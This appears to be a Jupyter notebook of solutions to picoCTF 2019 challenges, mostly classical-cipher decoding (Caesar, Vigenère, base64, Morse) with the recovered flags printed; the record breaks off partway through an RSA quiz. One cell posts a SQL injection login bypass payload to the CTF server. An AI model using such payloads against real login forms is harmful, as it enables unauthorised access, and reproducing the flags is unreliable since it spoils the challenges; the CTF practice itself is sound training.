{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "%matplotlib inline\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import base64\n",
    "import requests\n",
    "from bs4 import  BeautifulSoup\n",
    "from PIL import Image\n",
    "import numpy as np\n",
    "from io import BytesIO\n",
    "import cv2\n",
    "from sklearn.neighbors import KNeighborsClassifier\n",
    "from itertools import product\n",
    "import math\n",
    "import re\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## bases"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'l3arn_th3_r0p35'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s = base64.b64decode(\"bDNhcm5fdGgzX3IwcDM1\")\n",
    "s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Numbers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PICOCTFTHENUMBERSMASON"
     ]
    }
   ],
   "source": [
    "x = [16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]\n",
    "for n in x:\n",
    "    print(chr(ord('A')+n-1), end='')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 13"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "def caesar_crypto(s):\n",
    "    for offset in range(1, 26):\n",
    "        tmp = \"\"\n",
    "        for c in s:\n",
    "            if c.islower():\n",
    "                # print('lower', c, chr((ord(c) - ord('a') + offset) % 26 + ord('a')))\n",
    "                tmp += chr((ord(c) - ord('a') + offset) % 26 + ord('a'))\n",
    "            elif c.isupper():\n",
    "                # print('upper', c, chr((ord(c) - ord('A') + offset) % 26 + ord('A')))\n",
    "                tmp += chr((ord(c) - ord('A') + offset) % 26 + ord('A'))\n",
    "            else:\n",
    "                tmp += c\n",
    "        print(tmp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dwqcQHT{bch_hcc_por_ct_o_dfcpzsa}\n",
      "exrdRIU{cdi_idd_qps_du_p_egdqatb}\n",
      "fyseSJV{dej_jee_rqt_ev_q_fherbuc}\n",
      "gztfTKW{efk_kff_sru_fw_r_gifscvd}\n",
      "haugULX{fgl_lgg_tsv_gx_s_hjgtdwe}\n",
      "ibvhVMY{ghm_mhh_utw_hy_t_ikhuexf}\n",
      "jcwiWNZ{hin_nii_vux_iz_u_jlivfyg}\n",
      "kdxjXOA{ijo_ojj_wvy_ja_v_kmjwgzh}\n",
      "leykYPB{jkp_pkk_xwz_kb_w_lnkxhai}\n",
      "mfzlZQC{klq_qll_yxa_lc_x_molyibj}\n",
      "ngamARD{lmr_rmm_zyb_md_y_npmzjck}\n",
      "ohbnBSE{mns_snn_azc_ne_z_oqnakdl}\n",
      "picoCTF{not_too_bad_of_a_problem}\n",
      "qjdpDUG{opu_upp_cbe_pg_b_qspcmfn}\n",
      "rkeqEVH{pqv_vqq_dcf_qh_c_rtqdngo}\n",
      "slfrFWI{qrw_wrr_edg_ri_d_sureohp}\n",
      "tmgsGXJ{rsx_xss_feh_sj_e_tvsfpiq}\n",
      "unhtHYK{sty_ytt_gfi_tk_f_uwtgqjr}\n",
      "voiuIZL{tuz_zuu_hgj_ul_g_vxuhrks}\n",
      "wpjvJAM{uva_avv_ihk_vm_h_wyvislt}\n",
      "xqkwKBN{vwb_bww_jil_wn_i_xzwjtmu}\n",
      "yrlxLCO{wxc_cxx_kjm_xo_j_yaxkunv}\n",
      "zsmyMDP{xyd_dyy_lkn_yp_k_zbylvow}\n",
      "atnzNEQ{yze_ezz_mlo_zq_l_aczmwpx}\n",
      "buoaOFR{zaf_faa_nmp_ar_m_bdanxqy}\n"
     ]
    }
   ],
   "source": [
    "caesar_crypto(s)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## easy1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "c = \"UFJKXQZQUNB\"\n",
    "k = \"SOLVECRYPTO\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CRYPTOISFUN"
     ]
    }
   ],
   "source": [
    "for i in range(len(c)):\n",
    "    s = chr((ord(c[i]) - ord(k[i])) % 26 + ord('A'))\n",
    "    print(s, end='')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## caesar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "qjdpDUG{kzwaaqvobpmzcjqkwvogaquisf}\n",
      "rkeqEVH{laxbbrwpcqnadkrlxwphbrvjtg}\n",
      "slfrFWI{mbyccsxqdrobelsmyxqicswkuh}\n",
      "tmgsGXJ{nczddtyrespcfmtnzyrjdtxlvi}\n",
      "unhtHYK{odaeeuzsftqdgnuoazskeuymwj}\n",
      "voiuIZL{pebffvatgurehovpbatlfvznxk}\n",
      "wpjvJAM{qfcggwbuhvsfipwqcbumgwaoyl}\n",
      "xqkwKBN{rgdhhxcviwtgjqxrdcvnhxbpzm}\n",
      "yrlxLCO{sheiiydwjxuhkrysedwoiycqan}\n",
      "zsmyMDP{tifjjzexkyvilsztfexpjzdrbo}\n",
      "atnzNEQ{ujgkkafylzwjmtaugfyqkaescp}\n",
      "buoaOFR{vkhllbgzmaxknubvhgzrlbftdq}\n",
      "cvpbPGS{wlimmchanbylovcwihasmcguer}\n",
      "dwqcQHT{xmjnndiboczmpwdxjibtndhvfs}\n",
      "exrdRIU{ynkooejcpdanqxeykjcuoeiwgt}\n",
      "fyseSJV{zolppfkdqeboryfzlkdvpfjxhu}\n",
      "gztfTKW{apmqqglerfcpszgamlewqgkyiv}\n",
      "haugULX{bqnrrhmfsgdqtahbnmfxrhlzjw}\n",
      "ibvhVMY{crossingtherubicongysimakx}\n",
      "jcwiWNZ{dspttjohuifsvcjdpohztjnbly}\n",
      "kdxjXOA{etquukpivjgtwdkeqpiaukocmz}\n",
      "leykYPB{furvvlqjwkhuxelfrqjbvlpdna}\n",
      "mfzlZQC{gvswwmrkxlivyfmgsrkcwmqeob}\n",
      "ngamARD{hwtxxnslymjwzgnhtsldxnrfpc}\n",
      "ohbnBSE{ixuyyotmznkxahoiutmeyosgqd}\n"
     ]
    }
   ],
   "source": [
    "s = \"picoCTF{jyvzzpunaolybipjvunfzpthre}\"\n",
    "caesar_crypto(s)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## logon"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'https://2019shell1.picoctf.com/login'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload = {\n",
    "#     'id' : \"admin\", \n",
    "    'user' : \"' or 1=1 --\", \n",
    "    'password': ''\n",
    "}\n",
    "r = requests.post(url, data=payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"01100110 01100001 01101100 01100011 01101111 01101110\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "falcon"
     ]
    }
   ],
   "source": [
    "for c in s.split():\n",
    "    print(chr(int(c, 2)), end='')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"164 145 163 164 \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "test"
     ]
    }
   ],
   "source": [
    "for c in s.split():\n",
    "    print(chr(int(c, 8)), end='')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"616e696d6174696f6e\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "animation"
     ]
    }
   ],
   "source": [
    "for i in range(len(s)//2):\n",
    "    c = s[2*i:2*i+2]\n",
    "    print(chr(int(c, 16)), end='')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## grep2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "for d in `ls`; do\n",
    "    for f in `ls $d`; do\n",
    "        cat \"$d/$f\" | grep \"pico\"\n",
    "    done\n",
    "done"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## flags"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<PIL.Image.Image image mode=RGB size=1642x100 at 0x10D560630>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flag = Image.open(\"Flags/flag.png\")\n",
    "flag.crop((0, 0, 1642, 100))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "url = 'http://www.anbg.gov.au/images/flags/signal/{}.gif'\n",
    "alphabets = 'abcdefghijklmnopqrstuvwxyz'\n",
    "images = []\n",
    "for s in alphabets:\n",
    "    img = Image.open(BytesIO(requests.get(url.format(s)).content))\n",
    "    img = img.crop((70, 70, 490, 410)).resize((70, 70))\n",
    "    images.append(np.array(img.convert(\"RGB\")))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1800x216 with 26 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig, axs = plt.subplots(2, 13, figsize=(25, 3))\n",
    "for i in range(26):\n",
    "    x = i // 13\n",
    "    y = i % 13\n",
    "    axs[x][y].imshow(images[i])\n",
    "    axs[x][y].axis('off')\n",
    "    axs[x][y].set_title(alphabets[i])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 279,
   "metadata": {},
   "outputs": [],
   "source": [
    "features = []\n",
    "for img in images:\n",
    "    feat = cv2.calcHist([img], [0], None, [256], [0, 256])\n",
    "    features.append(feat.ravel())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1800x216 with 19 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig, axs = plt.subplots(1, 19, figsize=(25, 3))\n",
    "offset = 73\n",
    "offset2 = 39\n",
    "targets = []\n",
    "for i in range(19):\n",
    "    if i < 7:\n",
    "        img = flag.crop((0+offset*i, 0, 70+offset*i, 70))\n",
    "    else:\n",
    "        img = flag.crop((0+offset*i+offset2, 0, 70+offset*i+offset2, 70))\n",
    "\n",
    "    targets.append(np.array(img))\n",
    "    axs[i].imshow(img)\n",
    "    axs[i].axis('off')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pscoctffqagqsnsqaus\n"
     ]
    }
   ],
   "source": [
    "ans = \"\"\n",
    "for target in targets:\n",
    "#     feat = cv2.calcHist([target], [0], None, [256], [0, 256]).ravel()\n",
    "#     idx = np.argmin([cv2.compareHist(features[i], feat, 0) for i in range(26)])\n",
    "#     idx = np.argmin([np.linalg.norm(features[i] - feat) for i in range(26)])\n",
    "#     print([np.linalg.norm(features[i] - feat) for i in range(26)])\n",
    "    idx = np.argmax([metrics.structural_similarity(images[i], target, multichannel=True) for i in range(26)])\n",
    "#     idx = np.argmax([func(images[i], target) for i in range(26)])\n",
    "    ans += alphabets[idx]\n",
    "print(ans)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "諦めた。。。。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Mr.worldwide"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Kamigyo-ku Kyoto Kyoto-shi\n",
      "Odessa Odessa \n",
      "Dayton Ohio Montgomery County\n",
      "Eminoenue Istanbul \n",
      "Abu Dhabi Abu Dhabi \n",
      "Kuala Lumpur Kuala Lumpur \n",
      "Addis Ababa Adis Abeba \n",
      "Loja Loja \n",
      "Amsterdam North Holland Gemeente Amsterdam\n",
      "Sleepy Hollow New York Westchester County\n",
      "Kodiak Alaska Kodiak Island Borough\n",
      "Alexandria Alexandria \n",
      "\n"
     ]
    }
   ],
   "source": [
    "import reverse_geocoder as rg\n",
    "\n",
    "coordinates = [\n",
    "    (35.028309, 135.753082), \n",
    "    (46.469391, 30.740883), \n",
    "    (39.758949, -84.191605),\n",
    "     (41.015137, 28.979530),\n",
    "      (24.466667, 54.366669),\n",
    "       (3.140853, 101.693207),\n",
    "        None, \n",
    "       (9.005401, 38.763611),\n",
    "        (-3.989038, -79.203560),\n",
    "         (52.377956, 4.897070),\n",
    "          (41.085651, -73.858467),\n",
    "           (57.790001, -152.407227),\n",
    "            (31.205753, 29.924526)\n",
    "            ]\n",
    "\n",
    "a = \"\"\n",
    "b = \"\"\n",
    "c = \"\"\n",
    "for coord in coordinates:\n",
    "    if coord is None:\n",
    "        a += \"_\"\n",
    "        b += \"_\"\n",
    "        c += \"_\"\n",
    "        continue\n",
    "        \n",
    "    results = rg.search(coord) # default mode = 2\n",
    "    a += results[0]['name'][0]\n",
    "    b += results[0]['admin1'][0] if results[0]['admin1'] != \"\" else \" \"\n",
    "    c += results[0]['admin2'][0] if results[0]['admin2'] != \"\" else \" \"\n",
    "    print(results[0]['name'], results[0]['admin1'], results[0]['admin2'])\n",
    "print()    \n",
    "\n",
    "# for c in coordinates:\n",
    "#     results = rg.search(c) # default mode = 2\n",
    "#     print(results[0]['admin1'])\n",
    "# print()    \n",
    "    \n",
    "# for c in coordinates:\n",
    "#     results = rg.search(c) # default mode = 2\n",
    "#     print(results[0]['admin2'])    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'KODEAK_ALASKA'"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'KOOIAK_ALNNAA'"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'K M   _  GWK '"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "OrderedDict([('lat', '31.21564'),\n",
       "             ('lon', '29.95527'),\n",
       "             ('name', 'Alexandria'),\n",
       "             ('admin1', 'Alexandria'),\n",
       "             ('admin2', ''),\n",
       "             ('cc', 'EG')])"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## tapping"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [],
   "source": [
    "char2code = {\n",
    "                  \"A\": \".-\",\n",
    "                  \"B\": \"-...\",\n",
    "                  \"C\": \"-.-.\",\n",
    "                  \"D\": \"-..\",\n",
    "                  \"E\": \".\",\n",
    "                  \"F\": \"..-.\",\n",
    "                  \"G\": \"--.\",\n",
    "                  \"H\": \"....\",\n",
    "                  \"I\": \"..\",\n",
    "                  \"J\": \".---\",\n",
    "                  \"K\": \"-.-\",\n",
    "                  \"L\": \".-..\",\n",
    "                  \"M\": \"--\",\n",
    "                  \"N\": \"-.\",\n",
    "                  \"O\": \"---\",\n",
    "                  \"P\": \".--.\",\n",
    "                  \"Q\": \"--.-\",\n",
    "                  \"R\": \".-.\",\n",
    "                  \"S\": \"...\",\n",
    "                  \"T\": \"-\",\n",
    "                  \"U\": \"..-\",\n",
    "                  \"V\": \"...-\",\n",
    "                  \"W\": \".--\",\n",
    "                  \"X\": \"-..-\",\n",
    "                  \"Y\": \"-.--\",\n",
    "                  \"Z\": \"--..\",\n",
    "                  \"1\": \".----\",\n",
    "                  \"2\": \"..---\",\n",
    "                  \"3\": \"...--\",\n",
    "                  \"4\": \"....-\",\n",
    "                  \"5\": \".....\",\n",
    "                  \"6\": \"-....\",\n",
    "                  \"7\": \"--...\",\n",
    "                  \"8\": \"---..\",\n",
    "                  \"9\": \"----.\",\n",
    "                  \"0\": \"-----\",\n",
    "                  }\n",
    "code2char = {code:char for char, code in char2code.items()}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \".--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. .---- ---.. .---- ---.. ..--- ..--- ....- ..... --... ..... }\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ".--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. .---- ---.. .---- ---.. ..--- ..--- ....- ..... --... ..... }\n"
     ]
    }
   ],
   "source": [
    "print(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PICOCTF{M0RS3C0D31SFUN1818224575}\n"
     ]
    }
   ],
   "source": [
    "ans = \"\"\n",
    "for code in s.split():\n",
    "    if code == '{' or code == \"}\":\n",
    "        ans += code\n",
    "    else:\n",
    "        ans += code2char[code]\n",
    "print(ans)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## la cifra de"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 173,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "232"
      ]
     },
     "execution_count": 173,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ord(\"è\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 228,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = \"\"\"\n",
    "Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk\n",
    "\n",
    "Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd\n",
    "\n",
    "Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo \n",
    "\n",
    "Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3xg6ndl651}\n",
    "\n",
    "Yse lncsz bplr-izcarpnzjo dkxnroueius zf g uzlefwpnfmeznn cousex mzwkapr, cfd mgip axtfnj 1467 gj Lkty Bgyeiyyl Argprzn.\n",
    "\n",
    "Ehk Atgksèce Inahkw ts zmprkkzrk xzmkytmkx narqpd zmp Argprzn Oiyh zr Gqmexyt Cousex.\n",
    "\n",
    "Ny 1508, Jumlntjd Txnehkrtuy nyvkseej yse yt-narqpd zfmurf ceiyl (a sferoc zf ymtfzjo arusahjes) zmlt ctflj qltkw me g hciznnar hzmvtyety zf zmp Volpnèxj Nivmpr.\n",
    "\n",
    "Hjwlgxz’s yjnoti moupwez fapkfcej ny 1555 ay f notytnafeius zf zmp fowdt. Zmp lubpr nfwvkx zf zmp arusahjes gwp nub dhokeej wpgaqlrrd, muz yse gqahggpty fyd zmp itipx rjetkwd axj xidjo be rpatx zf g ryestyii ppy vmcayj, hhohs cgs me jnqfkwpnz bttn jlcn hzrxjdpusoety.\n",
    "\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 229,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 229,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = \"Bnretèwp\"\n",
    "x[5].islower()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 230,
   "metadata": {},
   "outputs": [],
   "source": [
    "def vigenere_cipher(s, k):\n",
    "    ans = \"\"\n",
    "    j = 0\n",
    "    for i in range(len(s)):\n",
    "        if s[i] == 'è':\n",
    "            ans += s[i]\n",
    "            continue\n",
    "            \n",
    "            \n",
    "        if s[i].islower():\n",
    "            ans += chr((ord(s[i]) - ord(k[j % len(k)])) % 26 + ord('a'))\n",
    "            j+=1\n",
    "        elif s[i].isupper():\n",
    "            ans += chr((ord(s[i]) - ord(k[j % len(k)]) + 32) % 26 + ord('A'))\n",
    "            j+=1\n",
    "#         elif s[i] == ',' or s[i] == ',':\n",
    "#             j+=1\n",
    "#             ans += s[i]\n",
    "#         elif s[i] == '\\n':\n",
    "#             ans += '\\n'\n",
    "#             j = 0\n",
    "        else:\n",
    "            ans += s[i]\n",
    "    return ans"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 231,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "agfl\n"
     ]
    }
   ],
   "source": [
    "\n",
    "for p in product(list(\"abcdefghijklmnopqrstuvwxyz\"), repeat=4):\n",
    "    k = ''.join(p)\n",
    "    dec = vigenere_cipher(\"Jumlntjd\", k)\n",
    "    if dec == \"Johannes\":\n",
    "        print(k)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Giovan Battista Bellaso  \n",
    "Vigenère cipher  \n",
    "Blaise de Vigenère  \n",
    "Friedrich Kasiski  \n",
    "Johannes Trithemius\n",
    "Jumlntjd Txnehkrtuy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 235,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "It is interesting how in history people often receive credit for things they did not create\n",
      "\n",
      "During the course of history, the Vigenère Cipher has been reinvented many times\n",
      "\n",
      "It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso \n",
      "\n",
      "For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3rb6cdf651}\n",
      "\n",
      "The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.\n",
      "\n",
      "The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.\n",
      "\n",
      "In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.\n",
      "\n",
      "Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "ans = vigenere_cipher(s, \"flag\")\n",
    "print(ans)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## pico browser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 238,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<!DOCTYPE html>\n",
       "<html lang=\"en\">\n",
       "<head>\n",
       "<title>My New Website</title>\n",
       "<link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\" rel=\"stylesheet\"/>\n",
       "<link href=\"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\" rel=\"stylesheet\"/>\n",
       "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n",
       "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n",
       "</head>\n",
       "<body>\n",
       "<div class=\"container\">\n",
       "<div class=\"header\">\n",
       "<nav>\n",
       "<ul class=\"nav nav-pills pull-right\">\n",
       "<li class=\"active\" role=\"presentation\"><a href=\"/\">Home</a>\n",
       "</li>\n",
       "<li role=\"presentation\"><a href=\"/unimplemented\">Sign In</a>\n",
       "</li>\n",
       "<li role=\"presentation\"><a href=\"/unimplemented\">Sign Out</a>\n",
       "</li>\n",
       "</ul>\n",
       "</nav>\n",
       "<h3 class=\"text-muted\">My New Website</h3>\n",
       "</div>\n",
       "<!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->\n",
       "<div class=\"alert alert-success alert-dismissible\" id=\"myAlert\" role=\"alert\">\n",
       "<button aria-label=\"Close\" class=\"close\" data-dismiss=\"alert\" type=\"button\"><span aria-hidden=\"true\">×</span></button>\n",
       "<!-- <strong>Title</strong> --> picobrowser!\n",
       "           </div>\n",
       "<div class=\"jumbotron\">\n",
       "<p class=\"lead\"></p>\n",
       "<p style=\"text-align:center; font-size:30px;\"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}</code></p>\n",
       "<!-- <p><a class=\"btn btn-lg btn-success\" href=\"admin\" role=\"button\">Click here for the flag!</a> -->\n",
       "<!-- </p> -->\n",
       "</div>\n",
       "<footer class=\"footer\">\n",
       "<p>© PicoCTF 2019</p>\n",
       "</footer>\n",
       "</div>\n",
       "<script>\n",
       "    $(document).ready(function(){\n",
       "        $(\".close\").click(function(){\n",
       "            $(\"myAlert\").alert(\"close\");\n",
       "        });\n",
       "    });\n",
       "    </script>\n",
       "</body>\n",
       "</html>"
      ]
     },
     "execution_count": 238,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url = 'https://2019shell1.picoctf.com/problem/12255/flag'\n",
    "user_agent = 'picobrowser'\n",
    "headers = {'User-Agent': user_agent}\n",
    "r = requests.get(url, headers=headers)\n",
    "soup = BeautifulSoup(r.content, 'lxml')\n",
    "soup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## rsa-pop-quiz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 247,
   "metadata": {},
   "outputs": [],
   "source": [
    "def is_prime(n):\n",
    "    i = 2\n",
    "    while i * i <= n:\n",
    "        if n % i == 0:\n",
    "            return False\n",
    "        i += 1\n",
    "    return True\n",
    "\n",
    "def gcd(m,n):\n",
    "    if m % n == 0:\n",
    "        return n\n",
    "    else:\n",
    "        return gcd(n,m%n)\n",
    "    \n",
    "def root_e(c, e, n):\n",
    "    bound = gmpy.root(n, e)[0]\n",
    "    m = gmpy.root(c, e)[0]\n",
    "    return m, bound\n",
    "\n",
    "def get_d(p, q, e):\n",
    "    phi = (p - 1) * (q - 1)\n",
    "\n",
    "    def extgcd(a, b):\n",
    "        if b == 0:\n",
    "            return 1, 0\n",
    "        x, y = extgcd(b, a % b)\n",
    "        return y, x - (a // b) * y\n",
    "\n",
    "\n",
    "    def mod_inverse(a, m):\n",
    "        x, y = extgcd(a, m)\n",
    "        return (m + x % m) % m\n",
    "\n",
    "\n",
    "    d = mod_inverse(e, phi)\n",
    "    return d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 353,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(True, True, 4636878989)"
      ]
     },
     "execution_count": 353,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 1\n",
    "p = 76753\n",
    "q = 60413\n",
    "is_prime(p), is_prime(q), p*q"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 355,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(0, 93089)"
      ]
     },
